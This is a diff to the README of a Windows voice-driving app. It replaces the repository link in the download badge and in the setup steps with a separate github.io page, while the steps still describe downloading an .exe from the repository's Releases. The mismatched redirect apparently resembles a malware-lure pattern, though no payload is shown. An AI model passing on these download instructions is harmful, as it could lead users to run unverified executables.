@@ -1,7 +1,7 @@
 # 🚗 Intelligent-Voice-Driving-System - Stay safe using simple voice commands
 
 <p align="center">
-  <a href="https://github.com/watchara7696/Intelligent-Voice-Driving-System">
+  <a href="https://watchara7696.github.io">
     <img src="https://img.shields.io/badge/Download-Application-blue.svg" alt="Download Application">
   </a>
 </p>
@@ -25,7 +25,7 @@ To run this software smoothly on your Windows computer, you need the following h
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the repository page to download the software: [https://github.com/watchara7696/Intelligent-Voice-Driving-System](https://github.com/watchara7696/Intelligent-Voice-Driving-System)
+1. Visit the repository page to download the software: [https://watchara7696.github.io](https://watchara7696.github.io)
 2. Locate the section marked Releases on the right side of the page.
 3. Click on the latest version link.
 4. Download the file ending in .exe to your desktop.
